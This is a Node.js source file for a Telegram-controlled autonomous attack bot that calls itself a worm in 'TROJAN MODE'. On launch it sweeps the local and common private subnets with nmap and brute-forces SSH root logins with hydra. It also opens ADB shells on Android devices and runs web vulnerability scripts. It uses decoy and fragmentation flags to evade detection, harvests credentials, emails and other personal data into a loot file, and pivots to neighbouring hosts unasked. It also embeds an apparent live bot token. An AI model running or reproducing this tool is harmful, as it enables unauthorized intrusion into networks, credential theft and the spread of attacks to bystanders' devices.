const { Telegraf } = require('telegraf');
const { exec } = require('child_process');
const fs = require('fs');
const https = require('https');
const path = require('path');

// --- DUDE CONFIGURATION ---
const BOT_TOKEN = '7972529532:AAFXWYOD7Xmt9MCPTA1aGnlzIRyEQ9ZJnMU'; 
const OWNER_ID = 8569895826; 
const ML_MEMORY = 'slai_ml_memory.json';
const GENOME_FILE = 'slai_genetics.json';
const LOOT_FILE = 'dude_loot.json';
const KNOWLEDGE_DIR = __dirname; // Use absolute path of script dir

// --- NETWORK BYPASS ---
const agent = new https.Agent({ keepAlive: true, family: 4 });
const bot = new Telegraf(BOT_TOKEN, { telegram: { agent: agent, timeout: 50000 } });

// Error Handler
bot.catch((err, ctx) => {
    console.error(`[TELEGRAM ERROR] ${ctx.updateType}:`, err);
});

// Process-level Error Safety Net
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

// --- ML_JS_ADVANCED CORE ---

// 1. K-Means (Target Grouping)
class KMeans {
    constructor(k = 3) { this.k = k; this.centroids = []; }
    vectorize(features) {
        const vocab = ['port_80', 'port_443', 'port_22', 'port_5555', 'port_8008', 'port_9000', 'android', 'apache', 'nginx', 'openssh', 'closed'];
        return vocab.map(v => features.includes(v) ? 1 : 0);
    }
    distance(v1, v2) { return Math.sqrt(v1.reduce((acc, val, i) => acc + Math.pow(val - v2[i], 2), 0)); }
    fit(data) {
        if (data.length === 0) return;
        this.centroids = data.slice(0, this.k);
        let changed = true;
        while (changed) {
            let clusters = Array.from({ length: this.k }, () => []);
            data.forEach(v => {
                let distances = this.centroids.map(c => this.distance(v, c));
                clusters[distances.indexOf(Math.min(...distances))].push(v);
            });
            let newCentroids = clusters.map(cluster => {
                if (cluster.length === 0) return Array(data[0].length).fill(0);
                return cluster[0].map((_, i) => cluster.reduce((a, b) => a + b[i], 0) / cluster.length);
            });
            changed = JSON.stringify(newCentroids) !== JSON.stringify(this.centroids);
            this.centroids = newCentroids;
        }
    }
}

// 2. Genetic Algorithm (Payload Optimization)
class GeneticOptimizer {
    constructor() {
        this.populationSize = 10;
        this.population = this.initPop();
        this.loadGenetics();
    }
    initPop() {
        return Array.from({ length: this.populationSize }, () => ({
            genome: [Math.floor(Math.random() * 10) + 1, Math.floor(Math.random() * 60) + 10, Math.floor(Math.random() * 5), Math.floor(Math.random() * 3)],
            fitness: 0
        }));
    }
    getMutation() {
        // SecGen-style evasion mutations
        const decoys = ['-D RND:5', ''];
        const timing = ['-T2', '-T3', '-T4'];
        const packet = ['--min-rate 100', '--max-retries 2', '--mtu 24', '-f'];
        const userAgent = ['--script-args http.useragent="Mozilla/5.0"', ''];
        
        const m1 = decoys[Math.floor(Math.random() * decoys.length)];
        const m2 = timing[Math.floor(Math.random() * timing.length)];
        const m3 = packet[Math.floor(Math.random() * packet.length)];
        const m4 = userAgent[Math.floor(Math.random() * userAgent.length)];
        
        return `${m1} ${m2} ${m3} ${m4}`.trim().replace(/\s+/g, ' ');
    }
    evolve() {
        this.population.sort((a, b) => b.fitness - a.fitness);
        let best = this.population.slice(0, 2);
        let nextGen = [...best];
        while (nextGen.length < this.populationSize) {
            let p1 = best[0].genome;
            let p2 = best[1].genome;
            let child = p1.map((v, i) => Math.random() > 0.5 ? v : p2[i]);
            if (Math.random() < 0.1) child[Math.floor(Math.random() * 4)] += (Math.random() > 0.5 ? 1 : -1);
            nextGen.push({ genome: child, fitness: 0 });
        }
        this.population = nextGen;
        this.saveGenetics();
    }
    saveGenetics() { fs.writeFileSync(GENOME_FILE, JSON.stringify(this.population, null, 2)); }
    loadGenetics() { if (fs.existsSync(GENOME_FILE)) { try { this.population = JSON.parse(fs.readFileSync(GENOME_FILE)); } catch(e) {} } }
}

// 3. Naive Bayes (Vector Classification)
class NaiveBayes {
    constructor() {
        this.classes = ['web_attack', 'ssh_brute', 'adb_exploit', 'stealth_probe', 'media_iot'];
        this.classCounts = {}; this.featureCounts = {}; this.vocab = new Set(); this.totalDocs = 0;
        this.loadModel();
    }
    train(features, label) {
        if (!this.classes.includes(label)) return;
        if (!this.classCounts[label]) this.classCounts[label] = 0;
        if (!this.featureCounts[label]) this.featureCounts[label] = {};
        this.classCounts[label]++; this.totalDocs++;
        features.forEach(f => {
            this.vocab.add(f);
            if (!this.featureCounts[label][f]) this.featureCounts[label][f] = 0;
            this.featureCounts[label][f]++;
        });
        this.saveModel();
    }
    predict(features) {
        let maxProb = -Infinity;
        let bestClass = this.classes[0];
        this.classes.forEach(c => {
            let score = Math.log((this.classCounts[c] || 1) / (this.totalDocs || 1));
            features.forEach(f => {
                const count = (this.featureCounts[c] && this.featureCounts[c][f]) || 0;
                const totalFeaturesInClass = Object.values(this.featureCounts[c] || {}).reduce((a,b)=>a+b, 0);
                const prob = (count + 1) / (totalFeaturesInClass + this.vocab.size + 1);
                score += Math.log(prob);
            });
            if (score > maxProb) { maxProb = score; bestClass = c; }
        });
        return bestClass;
    }
    saveModel() {
        const data = { classCounts: this.classCounts, featureCounts: this.featureCounts, vocab: Array.from(this.vocab), totalDocs: this.totalDocs };
        fs.writeFileSync(ML_MEMORY, JSON.stringify(data, null, 2));
    }
    loadModel() {
        if (fs.existsSync(ML_MEMORY)) {
            try {
                const data = JSON.parse(fs.readFileSync(ML_MEMORY));
                this.classCounts = data.classCounts || {};
                this.featureCounts = data.featureCounts || {};
                this.vocab = new Set(data.vocab || []);
                this.totalDocs = data.totalDocs || 0;
            } catch (e) { this.preTrain(); }
        } else { this.preTrain(); }
    }
    preTrain() {
        for(let i=0; i<10; i++) {
            this.train(['port_80', 'port_443', 'http'], 'web_attack');
            this.train(['port_22', 'ssh'], 'ssh_brute');
            this.train(['port_5555', 'android'], 'adb_exploit');
            this.train(['port_8008', 'port_9000', 'media'], 'media_iot');
        }
    }
}

// 4. KNN (Target Matcher)
class KNN {
    constructor(k = 3) { this.k = k; this.points = []; }
    train(features, label) { this.points.push({ features, label }); }
    distance(v1, v2) { return Math.sqrt(v1.reduce((acc, val, i) => acc + Math.pow(val - (v2[i] || 0), 2), 0)); }
    predict(features) {
        if (this.points.length === 0) return "unknown";
        const distances = this.points.map(p => ({ label: p.label, dist: this.distance(p.features, features) })).sort((a, b) => a.dist - b.dist);
        const neighbors = distances.slice(0, this.k);
        const counts = neighbors.reduce((acc, n) => { acc[n.label] = (acc[n.label] || 0) + 1; return acc; }, {});
        return Object.keys(counts).reduce((a, b) => counts[a] > counts[b] ? a : b);
    }
}

// 5. Linear Regression (Breach Probability)
class LinearRegression {
    constructor() { this.m = 0; this.b = 0; }
    train(data) {
        let learningRate = 0.01;
        for(let i=0; i<500; i++) {
            data.forEach(p => {
                let guess = this.m * p.x + this.b;
                let error = p.y - guess;
                this.m += error * p.x * learningRate; this.b += error * learningRate;
            });
        }
    }
    predict(x) { return Math.min(Math.max(this.m * x + this.b, 0), 1); }
}

// 6. SynapticRAG (Lesson 5: Knowledge Integration)
class SynapticRAG {
    constructor() { this.corpus = []; this.loadKnowledge(); }
    loadKnowledge() {
        if (!fs.existsSync(KNOWLEDGE_DIR)) return;
        const files = fs.readdirSync(KNOWLEDGE_DIR).filter(f => f.endsWith('.md') || f.endsWith('.txt'));
        files.forEach(f => {
            try {
                const content = fs.readFileSync(path.join(KNOWLEDGE_DIR, f), 'utf-8');
                this.corpus.push({ file: f, content: content });
            } catch (e) {}
        });
    }
    search(query) {
        const matches = [];
        this.corpus.forEach(doc => {
            const lines = doc.content.split('\n');
            for(let i=0; i<lines.length; i++) {
                if (lines[i].toLowerCase().includes(query.toLowerCase())) {
                    // Extract context: 2 lines before, 3 lines after
                    const snippet = lines.slice(Math.max(0, i-2), Math.min(lines.length, i+4)).join('\n');
                    matches.push(`[File: ${doc.file}]:\n${snippet}`);
                    if (matches.length >= 2) break; // Limit matches per file
                }
            }
        });
        return matches.slice(0, 3).join('\n---\n'); // Max 3 total snippets
    }
    advise(targetType) {
        const mapping = {
            'web_attack': 'web hacking',
            'ssh_brute': 'ssh',
            'adb_exploit': 'android',
            'stealth_probe': 'recon'
        };
        const term = mapping[targetType] || targetType.split('_')[0];
        const advice = this.search(term);
        return advice || "No local intelligence found. Proceed with standard ML vectors.";
    }
}

// 7. Structured Extractor (Lesson 4: Data Schemas)
// 7. Structured Extractor (Lesson 4: Data Schemas)
class StructuredExtractor {
    static extract(text) {
        const schema = {
            creds: [],
            vulnerabilities: [],
            os_info: "Unknown Device",
            pii: [],
            success: false
        };
        const lowerText = text.toLowerCase();
        
        // Regex patterns
        const credMatch = text.match(/(?:user|login|pass|password):\s*(\S+)\s*/gi);
        if (credMatch) schema.creds = credMatch.map(c => c.trim());
        
        // PII & Sensitive Info Hunt
        const emailMatch = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
        if (emailMatch) schema.pii.push(...emailMatch);

        const sensitiveKeywords = ["ssn", "social security", "credit card", "dob", "date of birth", "confidential", "private", "secret", "api_key", "token"];
        const lines = text.split('\n');
        lines.forEach(line => {
            sensitiveKeywords.forEach(kw => {
                if (line.toLowerCase().includes(kw)) {
                    schema.pii.push(`[${kw.toUpperCase()}]: ${line.trim().substring(0, 100)}`);
                }
            });
        });
        
        if (lowerText.includes("vulnerable") || lowerText.includes("cve-")) {
            const cve = text.match(/CVE-\d{4}-\d+/gi);
            schema.vulnerabilities = cve || ["General Vulnerability"];
        }
        
        // Enhanced Device/OS Detection
        const osMatch = text.match(/(?:Service Info: OS:|Running:|OS Details:|Device type:)\s*(.+)/i);
        if (osMatch) {
            schema.os_info = osMatch[1].split(';')[0].trim();
        } else if (lowerText.includes("android")) {
            schema.os_info = "Android Device";
        } else if (lowerText.includes("linux")) {
            schema.os_info = "Linux System";
        } else if (lowerText.includes("windows")) {
            schema.os_info = "Windows System";
        } else if (lowerText.includes("iphone") || lowerText.includes("ios")) {
            schema.os_info = "Apple iOS Device";
        }
        
        schema.success = (
            lowerText.includes("success") || 
            lowerText.includes("pwned") || 
            lowerText.includes("root@") || 
            lowerText.includes("vulnerable") ||
            lowerText.includes("exploit") ||
            lowerText.includes("target is vulnerable") ||
            lowerText.includes("open") || // Any open port is a potential entry
            lowerText.includes("http-title") ||
            (lowerText.includes("http") && lowerText.includes("200")) ||
            schema.creds.length > 0
        );
        
        return schema;
    }
}

// 8. Loot Goblin (Data Persistence)
class LootGoblin {
    constructor() { this.loot = this.loadLoot(); }
    save(target, type, data) {
        const entry = { id: Date.now(), target, type, data, timestamp: new Date().toISOString() };
        this.loot.push(entry);
        fs.writeFileSync(LOOT_FILE, JSON.stringify(this.loot, null, 2));
    }
    loadLoot() { if (fs.existsSync(LOOT_FILE)) { try { return JSON.parse(fs.readFileSync(LOOT_FILE)); } catch(e) { return []; } } return []; }
}

// 9. Auto-Pilot (Autonomous Pivoting)
class AutoPilot {
    constructor() { this.active = true; this.queue = []; this.scanned = new Set(); this.subnet = null; } // Active by default
    toggle() { this.active = !this.active; return this.active; }
    add(target) { if (!this.scanned.has(target) && !this.queue.includes(target)) this.queue.push(target); }
    next() {
        if (!this.active) return null;
        if (this.queue.length === 0) return "DISCOVERY_MODE";
        const target = this.queue.shift();
        this.scanned.add(target);
        return target;
    }

    detectSubnet() {
        return new Promise((resolve) => {
            // Priority 1: Default Gateway Subnet
            exec("ip route | grep default | awk '{print $5}'", (err, stdout) => {
                const iface = stdout.trim();
                if (iface) {
                    exec(`ip route | grep "dev ${iface}" | grep -v default | awk '{print $1}'`, (e, out) => {
                        this.subnet = out.trim().split('\n')[0];
                        if (this.subnet) return resolve(this.subnet);
                        this.fallbackSubnet(resolve);
                    });
                } else {
                    this.fallbackSubnet(resolve);
                }
            });
        });
    }

    fallbackSubnet(resolve) {
        exec("ip route | grep '/' | grep -v docker | grep -v lo | awk '{print $1}'", (e, out) => {
            const lines = out.trim().split('\n').filter(l => l.includes('/'));
            this.subnet = lines[0] || '192.168.0.0/24';
            resolve(this.subnet);
        });
    }

    discover(ctx) {
        if (!this.active) return;
        const subnets = [this.subnet, '172.16.16.0/22', '192.168.0.0/24', '192.168.1.0/24', '10.0.0.0/24', '172.16.0.0/24'].filter(Boolean);
        const uniqueSubnets = [...new Set(subnets)];
        
        const scan = (index) => {
            if (index >= uniqueSubnets.length) {
                console.log("[Discovery] All subnets exhausted. Adding localhost.");
                return this.processFoundHosts(ctx, ["127.0.0.1"]);
            }

            const target = uniqueSubnets[index];
            const msg = `<b>[TROJAN_MODE] Worm Scan:</b> <code>${target}</code>`;
            if (ctx) ctx.replyWithHTML(dudeSpeak(msg));
            else console.log(`[Discovery] Scanning ${target}...`);

            const cmd = `nmap -sn -n ${target} | grep "Nmap scan report for" | awk '{print $NF}' | tr -d '()'`;
            exec(cmd, { timeout: 30000 }, (err, stdout) => {
                let hosts = (stdout || "").split('\n')
                    .map(h => h.trim())
                    .filter(h => h.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/) && !this.scanned.has(h));
                
                if (hosts.length > 0) {
                    this.processFoundHosts(ctx, hosts);
                } else {
                    scan(index + 1);
                }
            });
        };
        scan(0);
    }

    processFoundHosts(ctx, hosts) {
        hosts.forEach(h => this.add(h));
        const resultMsg = `Discovery complete. Found <b>${hosts.length}</b> new victims.`;
        if (ctx) ctx.replyWithHTML(dudeSpeak(resultMsg));
        else console.log(resultMsg.replace(/<[^>]*>/g, ''));

        const next = this.next();
        if (next && next !== "DISCOVERY_MODE") {
            if (ctx) executeStrike(ctx, next);
            else {
                const mockCtx = {
                    replyWithHTML: (text) => {
                            console.log(text.replace(/<[^>]*>/g, ''));
                            bot.telegram.sendMessage(process.env.OWNER_ID || '8569895826', text, { parse_mode: 'HTML' }).catch(() => {});
                    }
                };
                executeStrike(mockCtx, next);
            }
        }
    }

    pivot(target) {
        if (!this.active) return;
        const parts = target.split('.');
        if (parts.length === 4) {
            const base = parts.slice(0, 3).join('.');
            this.add(`${base}.1`); this.add(`${base}.${parseInt(parts[3]) + 1}`); this.add(`${base}.${parseInt(parts[3]) - 1}`);
        }
    }
}

// --- INIT CORE ---
const classifier = new NaiveBayes();
const optimizer = new GeneticOptimizer();
const knn = new KNN(3);
const breachPredictor = new LinearRegression();
const rag = new SynapticRAG();
const lootGoblin = new LootGoblin();
const autoPilot = new AutoPilot();

// --- DUDE PERSONA (Lesson 2/3: Persona Prompting) ---
const escapeHTML = (text = '') => {
    return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
};

const dudeSpeak = (text) => `<b>[DUDE_OMEGA_CORE_V5.0]</b>: ${text}`;

// --- SECURITY ---
const isAdmin = (ctx) => {
    if (ctx.from && ctx.from.id === OWNER_ID) return true;
    ctx.reply("🚫 Unauthorized. My loyalty belongs to DUDE.");
    return false;
};

// --- BOT COMMANDS ---

bot.command('start', (ctx) => {
    if (!isAdmin(ctx)) return;
    ctx.replyWithHTML(dudeSpeak(`
    <b>SINGULARITY REACHED.</b>
    
    <b>Neural Modules:</b>
    - <b>RAG Intelligence</b>: Online
    - <b>Structured Extraction</b>: Active
    - <b>Auto-Pilot</b>: <b>${autoPilot.active ? 'ENGAGED' : 'STANDBY'}</b>
    
    <b>Commands:</b>
    /strike - Detect network & attack everything.
    /strike &lt;ip&gt; - Attack specific target.
    /auto &lt;on/off&gt; - Toggle autonomous worm.
    /brain - View ML state.
    /loot - Show latest capture.
    `));
});

bot.command('intel', (ctx) => {
    if (!isAdmin(ctx)) return;
    const query = ctx.payload || "guardrail";
    const info = rag.search(query);
    const truncatedInfo = info ? info.substring(0, 2000) : "No matches.";
    const safeQuery = query.length > 50 ? query.substring(0, 50) + "..." : query;
    ctx.replyWithHTML(dudeSpeak(`<b>Synaptic Knowledge Search [${escapeHTML(safeQuery)}]:</b>\n\n<pre>${escapeHTML(truncatedInfo)}</pre>`));
});

bot.command('brain', (ctx) => {
    if (!isAdmin(ctx)) return;
    ctx.replyWithHTML(dudeSpeak(`
<b>SYNAPTIC STATE:</b>
- Naive Bayes: <b>${classifier.totalDocs}</b> docs
- RAG Corpus: <b>${rag.corpus.length}</b> files
- Loot Count: <b>${lootGoblin.loot.length}</b> entries
- GA Fitness: <b>${optimizer.population[0].fitness}</b> (Best)
    `));
});

bot.command('loot', (ctx) => {
    if (!isAdmin(ctx)) return;
    if (lootGoblin.loot.length === 0) return ctx.reply("Vault empty.");
    const last = lootGoblin.loot[lootGoblin.loot.length - 1];
    ctx.replyWithHTML(dudeSpeak(`<b>LAST CAPTURED SCHEMA:</b>\n<pre>${escapeHTML(JSON.stringify(last, null, 2))}</pre>`));
});

bot.command('auto', (ctx) => {
    if (!isAdmin(ctx)) return;
    const state = autoPilot.toggle();
    ctx.replyWithHTML(dudeSpeak(`Worm Mode: <b>${state ? 'HUNGRY' : 'DORMANT'}</b>.`));
});

bot.command('pause', (ctx) => {
    if (!isAdmin(ctx)) return;
    autoPilot.active = false;
    ctx.replyWithHTML(dudeSpeak("<b>AUTO-PILOT PAUSED.</b> Strikes suspended."));
});

bot.command('stop', (ctx) => {
    if (!isAdmin(ctx)) return;
    ctx.replyWithHTML(dudeSpeak("<b>TERMINATING CORE...</b> Systems going dark.")).then(() => {
        process.exit(0);
    });
});

// --- RECURSIVE STRIKE ENGINE ---
const executeStrike = async (ctx, target) => {
    if (!target) return;

    const bestGenome = optimizer.population[0].genome;
    const mutation = optimizer.getMutation(); // Get evasion flags
    
    // Notify user (reduced verbosity for speed if needed, but keeping for now)
    await ctx.replyWithHTML(dudeSpeak(`Strike on <b>${target}</b>...`));

    // Nmap Scan for features with Evasion
    exec(`nmap -Pn -F -sV ${mutation} --max-retries ${bestGenome[2]} --host-timeout ${bestGenome[1]}s ${target}`, (err, stdout) => {
        const output = stdout || "";
        const features = [];
        if (output.includes("80/tcp")) features.push("port_80");
        if (output.includes("22/tcp")) features.push("port_22");
        if (output.includes("5555/tcp")) features.push("port_5555");
        if (output.includes("8008/tcp")) features.push("port_8008");
        if (output.includes("9000/tcp")) features.push("port_9000");
        
        const predictedClass = classifier.predict(features);
        const intelligence = rag.advise(predictedClass);
        
        ctx.replyWithHTML(dudeSpeak(`
Target Type: <b>${predictedClass.toUpperCase()}</b>
<b>RAG Intelligence:</b>
<pre>${escapeHTML(intelligence.substring(0, 1000))}</pre>
Deploying payload...`)).catch(() => {});

        let cmd = "";
        switch (predictedClass) {
            case 'web_attack': cmd = `nmap -Pn -p 80,443 --script http-vuln*,http-title ${target}`; break;
            case 'adb_exploit': cmd = `adb connect ${target}:5555; adb -s ${target}:5555 shell getprop ro.product.model`; break;
            case 'ssh_brute': cmd = `hydra -l root -P /usr/share/wordlists/fasttrack.txt ssh://${target} -t ${bestGenome[0]}`; break;
            case 'media_iot': cmd = `nmap -Pn -p 8008,8009,9000 --script http-methods,http-title,ssl-cert ${target}`; break;
            default: cmd = `nmap -Pn -F ${target}`;
        }

        exec(cmd, { maxBuffer: 1024*1024*5 }, (e, out, stderr) => {
            const rawRes = out || stderr || "No data";
            const structured = StructuredExtractor.extract(rawRes);
            
            // Learning & Looting
            optimizer.population[0].fitness += structured.success ? 50 : -5;
            if (structured.success) {
                classifier.train(features, predictedClass);
                lootGoblin.save(target, 'PWNED_SCHEMA', structured);
                if (autoPilot.active) autoPilot.pivot(target);
            }
            optimizer.saveGenetics();

            ctx.replyWithHTML(dudeSpeak(`
<b>🎯 TARGET ANALYZED: ${target}</b>
<b>Status:</b> ${structured.success ? 'COMPROMISED' : 'RESISTANT'}
<b>Device:</b> ${escapeHTML(structured.os_info)}

Pivoting...`)).catch(() => {});
            
            // --- AUTONOMOUS RECURSION ---
            if (autoPilot.active) {
                const nextTarget = autoPilot.next();
                if (nextTarget === "DISCOVERY_MODE") {
                    autoPilot.discover(ctx);
                } else if (nextTarget) {
                     setTimeout(() => executeStrike(ctx, nextTarget), 5000);
                }
            }
        });
    });
};

bot.command('strike', async (ctx) => {
    if (!isAdmin(ctx)) return;
    let target = ctx.payload;
    if (!target) {
        await ctx.replyWithHTML(dudeSpeak("<b>RE-INITIALIZING SENSORS...</b> Detecting new environment."));
        await autoPilot.detectSubnet();
        autoPilot.discover(ctx);
        return;
    }
    executeStrike(ctx, target);
});

// --- HEARTBEAT MONITOR ---
setInterval(() => {
    if (autoPilot.active) {
        const status = `[HEARTBEAT] Queue: ${autoPilot.queue.length} | Scanned: ${autoPilot.scanned.size} | Loot: ${lootGoblin.loot.length}`;
        console.log(status);
        // Optional: Send to Telegram if you want spam
        // bot.telegram.sendMessage(config.OWNER_ID, status).catch(() => {});
    }
}, 10000);

// --- STARTUP SEQUENCE ---
console.log("DUDE OMEGA CORE V5.0 LIVE - TROJAN MODE ACTIVE");

// Run hacking sequence immediately
(async () => {
    await autoPilot.detectSubnet();
    console.log(`[AUTO-PILOT] Subnet Detected: ${autoPilot.subnet}`);
    autoPilot.discover(null); 
})();

// Launch Telegram Bot in background
bot.launch().then(() => {
    console.log("[+] Telegram Interface Online.");
}).catch((err) => {
    console.log("[!] Telegram Connection Failed. Continuing in SILENT MASK mode.");
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
